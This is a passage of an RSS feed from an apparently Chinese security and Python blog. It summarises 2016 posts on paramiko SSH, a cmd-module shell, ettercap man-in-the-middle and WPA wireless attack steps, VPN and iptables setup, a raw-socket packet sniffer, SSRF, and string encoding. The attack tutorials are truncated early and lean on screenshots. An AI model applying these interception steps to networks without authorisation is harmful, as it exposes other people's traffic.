&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>stdin,stdout,stderr &lt;span style="color:#f92672">=&lt;/span> ssh&lt;span style="color:#f92672">.&lt;/span>exec_command(&lt;span style="color:#e6db74">&amp;#34;ls -l&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print stdin
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print stdout&lt;span style="color:#f92672">.&lt;/span>readlines() &lt;span style="color:#75715e">#返回执行结果&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print stderr&lt;span style="color:#f92672">.&lt;/span>readlines() &lt;span style="color:#75715e">#有错误信息就返回错误信息，没有就返回空&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ssh&lt;span style="color:#f92672">.&lt;/span>close()
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://wyb0.cn/img/post/paramiko_ssh_one_command.png" alt="paramiko远程ssh后执行一条命令">&lt;/p></description></item><item><title>Python 的 cmd 模块</title><link>https://wyb0.cn/posts/2016/python-module-cmd/</link><pubDate>Thu, 14 Jul 2016 09:44:06 +0000</pubDate><guid>https://wyb0.cn/posts/2016/python-module-cmd/</guid><description>&lt;h3 id="0x00-关于cmd模块">0x00 关于cmd模块&lt;/h3>
&lt;p>使用cmd模块创建的命令行解释器可以循环读取输入的所有行并且解析它们&lt;/p>
&lt;h3 id="0x01-cmd模块的一些常用方法">0x01 cmd模块的一些常用方法：&lt;/h3>
&lt;ol>
&lt;li>cmdloop()：类似与Tkinter的mainloop，运行Cmd解析器&lt;/li>
&lt;li>onecmd(str)：读取输入，并进行处理，通常不需要重载该函数，而是使用更加具体的do_command来执行特定的命名&lt;/li>
&lt;li>emptyline()：当输入空行时调用该方法&lt;/li>
&lt;li>default(line)：当无法识别输入的command时调用该方法&lt;/li>
&lt;li>completedefault(text,line,begidx,endidx):如果不存在针对的complete_*()方法，那么会调用该函数&lt;/li>
&lt;li>precmd(line)：命令line解析之前被调用该方法&lt;/li>
&lt;li>postcmd(stop，line)：命令line解析之后被调用该方法&lt;/li>
&lt;li>preloop()：cmdloop()运行之前调用该方法&lt;/li>
&lt;li>postloop()：cmdloop()退出之后调用该方法&lt;/li>
&lt;/ol>
&lt;h3 id="0x02-用cmd模块简单实现shell命令">0x02 用cmd模块简单实现shell命令&lt;/h3>
&lt;pre tabindex="0">&lt;code>#!/usr/bin/env python
#-*- coding:utf-8 -*-

import sys
import os
import socket
from cmd import Cmd

class ClassShell(Cmd):
 &amp;#34;&amp;#34;&amp;#34;docstring for ClassShell&amp;#34;&amp;#34;&amp;#34;
 def __init__(self):
 Cmd.__init__(self)
 os.chdir(&amp;#34;C:/Users/reber/Desktop&amp;#34;)
 hostName = socket.gethostname()
 self.prompt = &amp;#34;reber@&amp;#34; + hostName + &amp;#34; &amp;#34; + os.path.abspath(&amp;#39;.&amp;#39;) + &amp;#34;\n$ &amp;#34;
 

 def help_dir(self):
 print &amp;#34;dir [path]&amp;#34;
 def do_dir(self, arg):
 if not arg:
 print &amp;#34;\n&amp;#34;.join(os.listdir(&amp;#39;.&amp;#39;))
 elif os.path.exists(arg):
 print &amp;#34;\n&amp;#34;.join(os.listdir(arg))
 else:
 print &amp;#34;no such path exists&amp;#34;

 def help_ls(self):
 print &amp;#34;ls [path]&amp;#34;
 def do_ls(self, arg):
 if not arg:
 print &amp;#34;\n&amp;#34;.join(os.listdir(&amp;#39;.&amp;#39;))
 elif os.path.exists(arg):
 print &amp;#34;\n&amp;#34;.join(os.listdir(arg))
 else:
 print &amp;#34;no such path exists&amp;#34;

 def help_pwd(self):
 print &amp;#34;pwd&amp;#34;
 def do_pwd(self, arg):
 print os.path.abspath(&amp;#39;.&amp;#39;)

 def help_cd(self):
 print &amp;#34;cd [path]&amp;#34;
 def do_cd(self, arg):
 hostName = socket.gethostname()
 if not arg:
 os.chdir(&amp;#34;C:/Users/reber/Desktop&amp;#34;)
 self.prompt = &amp;#34;reber@&amp;#34; + hostName + &amp;#34; &amp;#34; + os.path.abspath(&amp;#39;.&amp;#39;) + &amp;#34;\n$ &amp;#34;
 elif os.path.exists(arg):
 os.chdir(arg)
 self.prompt = &amp;#34;reber@&amp;#34; + hostName + &amp;#34; &amp;#34; + os.path.abspath(&amp;#39;.&amp;#39;) + &amp;#34;\n$ &amp;#34;
 else:
 print &amp;#34;no such path&amp;#34;

 def help_clear(self):
 print &amp;#34;clear&amp;#34;
 def do_clear(self, arg):
 i = os.system(&amp;#39;cls&amp;#39;)

 def help_cat(self):
 print &amp;#34;cat filename&amp;#34;
 def do_cat(self, arg):
 if os.path.exists(arg):
 with open(arg,&amp;#34;r&amp;#34;) as f:
 data = f.read()
 print data
 else:
 print &amp;#34;no such file exists&amp;#34;

 def help_mv(self):
 print &amp;#34;mv oldfilename newfilename&amp;#34;
 def do_mv(self, arg):
 oldfilename,newfilename = arg.split()
 if os.path.exists(oldfilename):
 os.rename(oldfilename,newfilename)
 else:
 print &amp;#34;no such file:&amp;#34; + oldfilename

 def help_touch(self):
 print &amp;#34;touch filename&amp;#34;
 def do_touch(self, arg):
 with open(arg, &amp;#34;w&amp;#34;) as f:
 pass

 def help_rm(self):
 print &amp;#34;rm filepath&amp;#34;
 def do_rm(self, arg):
 if os.path.exists(arg):
 os.remove(arg)
 else:
 print &amp;#34;no such file:&amp;#34; + arg
 
 def help_cp(self):
 print &amp;#34;cp oldfilepath newfilepath&amp;#34;
 def do_cp(self, arg):
 oldfilepath,newfilepath = arg.split()
 if os.path.exists(oldfilepath):
 with open(oldfilepath, &amp;#34;r&amp;#34;) as f:
 data = f.read()
 with open(newfilepath, &amp;#34;w&amp;#34;) as f:
 f.write(data)
 else:
 print &amp;#34;no such path:&amp;#34; + oldfilepath

 def help_exit(self):
 print &amp;#34;input exit will exit the program&amp;#34;

 def do_exit(self, arg):
 print &amp;#34;Exit:&amp;#34;,arg
 sys.exit()


if __name__ == &amp;#39;__main__&amp;#39;:
 shell = ClassShell()
 shell.cmdloop()
&lt;/code>&lt;/pre>&lt;h3 id="0x03-程序执行结果如下">0x03 程序执行结果如下&lt;/h3>
&lt;p>&lt;img src="https://wyb0.cn/img/post/cmd_results_sample.png" alt="60">&lt;/p></description></item><item><title>无线下 ettercap 做中间人攻击</title><link>https://wyb0.cn/posts/2016/in-the-wireless-use-ettercap-to-do-man-in-the-middle-attack/</link><pubDate>Wed, 13 Jul 2016 09:22:39 +0000</pubDate><guid>https://wyb0.cn/posts/2016/in-the-wireless-use-ettercap-to-do-man-in-the-middle-attack/</guid><description>&lt;p>前提：攻击主机和被攻击主机在一个无线下面&lt;/p>
&lt;h3 id="0x00-打开ettercap">0x00 打开ettercap&lt;/h3>
&lt;p>&lt;img src="https://wyb0.cn/img/post/wireless_start_ettercap.png" alt="无线网络渗透测试打开ettercap">&lt;/p>
&lt;h3 id="0x01-查看host列表">0x01 查看host列表&lt;/h3>
&lt;p>在软件的图形化界面点击sniff，选择unified sniffing选择网卡，然后单击hosts选项，选择scan for host，然后选择host list
&lt;img src="https://wyb0.cn/img/post/wireless_ettercap_see_host_list.png" alt="无线网络渗透测试ettercap查看host列表">&lt;/p></description></item><item><title>攻击 WPA 保护下的 802.11 网络</title><link>https://wyb0.cn/posts/2016/attack-802.11-network-under-wpa-protection/</link><pubDate>Wed, 13 Jul 2016 08:18:59 +0000</pubDate><guid>https://wyb0.cn/posts/2016/attack-802.11-network-under-wpa-protection/</guid><description>&lt;h3 id="0x00-网络拓扑及信息">0x00 网络拓扑及信息&lt;/h3>
&lt;p>&lt;img src="https://wyb0.cn/img/post/wireless_topology.png" alt="无线网络渗透测试拓扑图">
其中 ip 等信息如下：
&lt;img src="https://wyb0.cn/img/post/wireless_base_msg.png" alt="无线网络渗透测试IP等基本信息">&lt;/p>
&lt;h3 id="0x01-获取信息">0x01 获取信息&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>查看无线网卡并将其设置为监听模式
&lt;img src="https://wyb0.cn/img/post/wireless_ifconfig.png" alt="无线网络渗透测试查看网卡信息">
&lt;img src="https://wyb0.cn/img/post/wireless_mode_to_monitor.png" alt="无线网络渗透测试设置网卡为监听模式">&lt;/p>
&lt;/li>
&lt;li>
&lt;p>打开 kismet，进行基本设置
&lt;img src="https://wyb0.cn/img/post/wireless_start_kismet.png" alt="无线网络渗透测试开启kismet">
&lt;img src="https://wyb0.cn/img/post/wireless_kismet_add_source.png" alt="无线网络渗透测试add source">
&lt;img src="https://wyb0.cn/img/post/wireless_kismet.png" alt="无线网络渗透测试kismet主界面">&lt;/p>
&lt;/li>
&lt;li>
&lt;p>选择名字为 111111 的 AP 为目标
&lt;img src="https://wyb0.cn/img/post/wireless_select_target.png" alt="无线网络渗透测试kismet选择目标">
&lt;img src="https://wyb0.cn/img/post/wireless_target_msg.png" alt="无线网络渗透测试AP的信息">
&lt;img src="https://wyb0.cn/img/post/wireless_quit_kismet.png" alt="无线网络渗透测试退出kismet">&lt;/p></description></item><item><title>Windows2003 下搭建 VPN</title><link>https://wyb0.cn/posts/2016/windows2003-set-up-vpn/</link><pubDate>Thu, 07 Jul 2016 10:39:50 +0000</pubDate><guid>https://wyb0.cn/posts/2016/windows2003-set-up-vpn/</guid><description>&lt;h3 id="0x00-环境及要求">0x00 环境及要求&lt;/h3>
&lt;p>Windows2003下搭建基于PPTP(点对点隧道协议)的VPN服务器&lt;/p>
&lt;h3 id="0x01-安装服务">0x01 安装服务&lt;/h3>
&lt;p>&lt;img src="https://wyb0.cn/img/post/build_vpn_install_service1.png" alt="70">
&lt;img src="https://wyb0.cn/img/post/build_vpn_install_service2.png" alt="60">
&lt;img src="https://wyb0.cn/img/post/build_vpn_close_firewall.png" alt="80">&lt;/p>
&lt;h3 id="0x02-配置并启用路由和远程访问">0x02 配置并启用路由和远程访问&lt;/h3>
&lt;p>&lt;img src="https://wyb0.cn/img/post/build_vpn_config_and_start_routing_remote_access1.png" alt="35">
&lt;img src="https://wyb0.cn/img/post/build_vpn_config_and_start_routing_remote_access2.png" alt="55">
&lt;img src="https://wyb0.cn/img/post/build_vpn_config_and_start_routing_remote_access3.png" alt="55">
&lt;img src="https://wyb0.cn/img/post/build_vpn_config_and_start_routing_remote_access4.png" alt="65">
&lt;img src="https://wyb0.cn/img/post/build_vpn_config_and_start_routing_remote_access5.png" alt="65">&lt;/p></description></item><item><title>iptables 简单配置 DMZ</title><link>https://wyb0.cn/posts/2016/iptables-configure-dmz/</link><pubDate>Tue, 05 Jul 2016 09:56:35 +0000</pubDate><guid>https://wyb0.cn/posts/2016/iptables-configure-dmz/</guid><description>&lt;h3 id="0x00-要求">0x00 要求&lt;/h3>
&lt;ol>
&lt;li>内网可以访问外网&lt;/li>
&lt;li>内网可以访问DMZ区&lt;/li>
&lt;li>外网不能访问内网&lt;/li>
&lt;li>外网能访问DMZ区的服务&lt;/li>
&lt;li>DMZ区不能访问内网&lt;/li>
&lt;li>DMZ区不能主动访问外网&lt;/li>
&lt;/ol>
&lt;h3 id="0x01-拓扑">0x01 拓扑&lt;/h3>
&lt;p>&lt;img src="https://wyb0.cn/img/post/iptables_dmz_topology.png" alt="50">&lt;/p></description></item><item><title>Python 简单解码 IP 头</title><link>https://wyb0.cn/posts/2016/python-simple-decode-ip-head/</link><pubDate>Sun, 03 Jul 2016 20:06:39 +0000</pubDate><guid>https://wyb0.cn/posts/2016/python-simple-decode-ip-head/</guid><description>&lt;h3 id="0x00-解码ip头">0x00 解码IP头&lt;/h3>
&lt;p>Windows上运行时要以管理员身份运行&lt;br>
代码可以解码IP头统计通信信息并保存到文本，同时统计数量&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/usr/bin/env python&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#-*- coding:utf-8 -*-&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> socket
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> os
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> sys
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> time
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> struct 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> ctypes &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>host &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;10.22.114.114&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>tcp_num &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>udp_num &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>icmp_num &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">IP&lt;/span>(Structure):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _fields_ &lt;span style="color:#f92672">=&lt;/span> [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#e6db74">&amp;#34;ihl&amp;#34;&lt;/span>, c_ubyte,&lt;span style="color:#ae81ff">4&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#e6db74">&amp;#34;version&amp;#34;&lt;/span>, c_ubyte,&lt;span style="color:#ae81ff">4&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#e6db74">&amp;#34;tos&amp;#34;&lt;/span>, c_ubyte),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#e6db74">&amp;#34;len&amp;#34;&lt;/span>, c_ushort),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#e6db74">&amp;#34;id&amp;#34;&lt;/span>, c_ushort),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#e6db74">&amp;#34;offset&amp;#34;&lt;/span>, c_ushort),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#e6db74">&amp;#34;ttl&amp;#34;&lt;/span>, c_ubyte),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#e6db74">&amp;#34;protocol_num&amp;#34;&lt;/span>,c_ubyte),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#e6db74">&amp;#34;sum&amp;#34;&lt;/span>, c_ushort),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#e6db74">&amp;#34;src&amp;#34;&lt;/span>, c_ulong),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#e6db74">&amp;#34;dst&amp;#34;&lt;/span>, c_ulong)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> __new__ (self,socket_buffer&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">None&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>from_buffer_copy(socket_buffer)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> __init__ (self,socket_buffer&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">None&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>protocol_map &lt;span style="color:#f92672">=&lt;/span> {&lt;span style="color:#ae81ff">1&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;ICMP&amp;#34;&lt;/span>,&lt;span style="color:#ae81ff">6&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;TCP&amp;#34;&lt;/span>,&lt;span style="color:#ae81ff">17&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;UDP&amp;#34;&lt;/span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>src_address &lt;span style="color:#f92672">=&lt;/span> socket&lt;span style="color:#f92672">.&lt;/span>inet_ntoa(struct&lt;span style="color:#f92672">.&lt;/span>pack(&lt;span style="color:#e6db74">&amp;#34;&amp;lt;L&amp;#34;&lt;/span>,self&lt;span style="color:#f92672">.&lt;/span>src))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>dst_address &lt;span style="color:#f92672">=&lt;/span> socket&lt;span style="color:#f92672">.&lt;/span>inet_ntoa(struct&lt;span style="color:#f92672">.&lt;/span>pack(&lt;span style="color:#e6db74">&amp;#34;&amp;lt;L&amp;#34;&lt;/span>,self&lt;span style="color:#f92672">.&lt;/span>dst))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>protocol &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>protocol_map[self&lt;span style="color:#f92672">.&lt;/span>protocol_num]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>protocol &lt;span style="color:#f92672">=&lt;/span> str(self&lt;span style="color:#f92672">.&lt;/span>protocol_num)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> os&lt;span style="color:#f92672">.&lt;/span>name &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;nt&amp;#34;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> socket_protocol &lt;span style="color:#f92672">=&lt;/span> socket&lt;span style="color:#f92672">.&lt;/span>IPPROTO_IP
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> socket_protocol &lt;span style="color:#f92672">=&lt;/span> socket&lt;span style="color:#f92672">.&lt;/span>IPPROTO_ICMP
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sniffer &lt;span style="color:#f92672">=&lt;/span> socket&lt;span style="color:#f92672">.&lt;/span>socket(socket&lt;span style="color:#f92672">.&lt;/span>AF_INET,socket&lt;span style="color:#f92672">.&lt;/span>SOCK_RAW,socket_protocol)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sniffer&lt;span style="color:#f92672">.&lt;/span>bind((host,&lt;span style="color:#ae81ff">0&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sniffer&lt;span style="color:#f92672">.&lt;/span>setsockopt(socket&lt;span style="color:#f92672">.&lt;/span>IPPROTO_IP,socket&lt;span style="color:#f92672">.&lt;/span>IP_HDRINCL,&lt;span style="color:#ae81ff">1&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> os&lt;span style="color:#f92672">.&lt;/span>name &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;nt&amp;#34;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sniffer&lt;span style="color:#f92672">.&lt;/span>ioctl(socket&lt;span style="color:#f92672">.&lt;/span>SIO_RCVALL,socket&lt;span style="color:#f92672">.&lt;/span>RCVALL_ON)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> raw_buffer &lt;span style="color:#f92672">=&lt;/span> sniffer&lt;span style="color:#f92672">.&lt;/span>recvfrom(&lt;span style="color:#ae81ff">65565&lt;/span>)[&lt;span style="color:#ae81ff">0&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ip_header &lt;span style="color:#f92672">=&lt;/span> IP(raw_buffer[&lt;span style="color:#ae81ff">0&lt;/span>:&lt;span style="color:#ae81ff">32&lt;/span>])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Protocol: &lt;/span>&lt;span style="color:#e6db74">%-5s&lt;/span>&lt;span style="color:#e6db74"> &lt;/span>&lt;span style="color:#e6db74">%-15s&lt;/span>&lt;span style="color:#e6db74"> -&amp;gt; &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (ip_header&lt;span style="color:#f92672">.&lt;/span>protocol,ip_header&lt;span style="color:#f92672">.&lt;/span>src_address,ip_header&lt;span style="color:#f92672">.&lt;/span>dst_address)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ip_header&lt;span style="color:#f92672">.&lt;/span>protocol &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;TCP&amp;#34;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tcp_num &lt;span style="color:#f92672">=&lt;/span> tcp_num &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">elif&lt;/span> ip_header&lt;span style="color:#f92672">.&lt;/span>protocol &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;UDP&amp;#34;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> udp_num &lt;span style="color:#f92672">=&lt;/span> udp_num &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">elif&lt;/span> ip_header&lt;span style="color:#f92672">.&lt;/span>protocol &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;ICMP&amp;#34;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> icmp_num &lt;span style="color:#f92672">=&lt;/span> icmp_num &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> num &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;TCP:&lt;/span>&lt;span style="color:#e6db74">%d&lt;/span>&lt;span style="color:#ae81ff">\t&lt;/span>&lt;span style="color:#e6db74">UDP:&lt;/span>&lt;span style="color:#e6db74">%d&lt;/span>&lt;span style="color:#ae81ff">\t&lt;/span>&lt;span style="color:#e6db74">ICMP:&lt;/span>&lt;span style="color:#e6db74">%d&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (tcp_num,udp_num,icmp_num)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># print num&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">with&lt;/span> open(&lt;span style="color:#e6db74">&amp;#34;data.txt&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;a+&amp;#34;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> f:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> f&lt;span style="color:#f92672">.&lt;/span>write(msg&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sys&lt;span style="color:#f92672">.&lt;/span>stdout&lt;span style="color:#f92672">.&lt;/span>write(num&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\r&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sys&lt;span style="color:#f92672">.&lt;/span>stdout&lt;span style="color:#f92672">.&lt;/span>flush()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> time&lt;span style="color:#f92672">.&lt;/span>sleep(&lt;span style="color:#ae81ff">0.5&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#CTRL-C&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">except&lt;/span> &lt;span style="color:#a6e22e">KeyboardInterrupt&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> os&lt;span style="color:#f92672">.&lt;/span>name &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;nt&amp;#34;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sniffer&lt;span style="color:#f92672">.&lt;/span>ioctl(socket&lt;span style="color:#f92672">.&lt;/span>SIO_RCVALL,socket&lt;span style="color:#f92672">.&lt;/span>RCVALL_OFF)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="0x01-结果">0x01 结果&lt;/h3>
&lt;p>&lt;img src="https://wyb0.cn/img/post/ip_decoding_run_msg.png" alt="程序运行信息">&lt;/p></description></item><item><title>SSRF</title><link>https://wyb0.cn/posts/2016/ssrf/</link><pubDate>Thu, 30 Jun 2016 15:30:54 +0000</pubDate><guid>https://wyb0.cn/posts/2016/ssrf/</guid><description>&lt;h3 id="0x00-什么是ssrf">0x00 什么是SSRF&lt;/h3>
&lt;p>SSRF(Server-Side Request Forgery:服务请求伪造)是一种由攻击者构造，从而让服务端发起请求的一种安全漏洞，&lt;font color="FF0000">它将一个可以发起网络请求的服务当作跳板来攻击其他服务&lt;/font>，SSRF的攻击目标一般是&lt;font color="FF0000">内网&lt;/font>。&lt;br>
当服务端提供了从其他服务器获取数据的功能(如:从指定URL地址获取网页文本内容、加载指定地址的图片、下载等)，但是没有对目标地址做过滤与限制时就会出现SSRF。&lt;/p></description></item><item><title>Python 的编码问题</title><link>https://wyb0.cn/posts/2016/python-encode-setting/</link><pubDate>Wed, 29 Jun 2016 15:14:11 +0000</pubDate><guid>https://wyb0.cn/posts/2016/python-encode-setting/</guid><description>&lt;h3 id="0x00-几个编码函数">0x00 几个编码函数&lt;/h3>
&lt;pre tabindex="0">&lt;code>* ord(x) 
 将字符转换为10进制整数(0~255之间) #ord(&amp;#39;a&amp;#39;)==&amp;gt;97
* chr(x) 
 将10进制整数(0~255之间)转换为字符 #chr(97)==&amp;gt;&amp;#39;a&amp;#39;，chr(0x61)==&amp;gt;&amp;#39;a&amp;#39;

* b2a_hex(x) 
 将字符转换为对应的16进制 #import binascii;binascii.b2a_hex(&amp;#39;a&amp;#39;)==&amp;gt;&amp;#39;61&amp;#39;
* a2b_hex(x) 
